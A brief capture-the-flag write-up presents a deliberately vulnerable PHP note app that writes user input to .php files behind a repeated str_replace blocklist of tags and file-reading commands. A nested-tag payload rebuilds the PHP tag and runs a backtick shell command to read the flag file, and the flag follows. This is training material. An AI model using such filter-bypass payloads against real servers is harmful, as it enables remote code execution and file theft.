# PHat Pottomed Girls

*Now it's attempt number 3 and this time with a Queen reference! (flag is in the root directory)*

---
源文件:
```php+HTML
<?php
session_start();

function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function filter($originalstring) {
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}

if(isset($_POST["notewrite"])) {
    $newnote = $_POST["notewrite"];

    //3rd times the charm and I've learned my lesson. Now I'll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```

**Payload**

```php+HTML
<<<<<<<?php??php??php??php
 echo `sort /fffflaglaglaglag.php`;
????>>>>
```

**flag:**`flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}`
